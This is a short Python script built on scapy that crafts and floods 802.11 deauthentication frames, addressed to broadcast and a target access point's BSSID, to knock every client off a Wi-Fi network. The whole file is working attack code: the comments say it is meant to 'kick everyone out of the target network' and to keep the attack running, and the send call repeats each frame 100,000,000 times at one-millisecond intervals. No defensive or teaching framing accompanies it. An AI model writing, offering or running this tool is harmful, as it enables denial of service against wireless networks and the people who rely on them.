from scapy.all import sendp
from scapy.layers.dot11 import Dot11Deauth, RadioTap,Dot11

def DeAuthLoop(interface, brdMac, BSSID, numOfPack):
    for i in range(0, numOfPack):
        # This creates a Dot11Deauth packet that will be used to kick everyone out of the target network
        # Addr1 is the broadcast addr
        # Addr2 is the target addr
        # Addr3 is used to target specific clients but I set it to the target addr to kick everyone off the network
        pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
        sendp(pkt, iface=interface, count=100000000,
              inter=.001)  # Send deauth packet


def setTarget(brdMac,interface,BSSID):
    
    numOfPack = int(input("how many packets do u wish to send? "))
    # infinite loop to keep the attack running forever, this loop is for setting up the deauth packet and sending it
    DeAuthLoop(interface, brdMac, BSSID, numOfPack)

    return brdMac